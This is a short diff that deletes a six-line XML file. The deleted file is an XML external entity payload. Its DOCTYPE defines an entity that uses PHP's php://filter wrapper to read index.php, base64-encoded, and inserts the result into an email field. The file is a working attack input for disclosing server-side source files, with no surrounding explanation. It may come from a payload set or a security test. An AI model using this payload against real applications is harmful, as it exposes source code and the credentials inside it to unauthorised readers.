@@ -1,6 +1,0 @@
-<?xml version="1.0" ?>
-<!DOCTYPE version [
-<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
-<Version>
-<email>&xxe;</email>
-</Version>
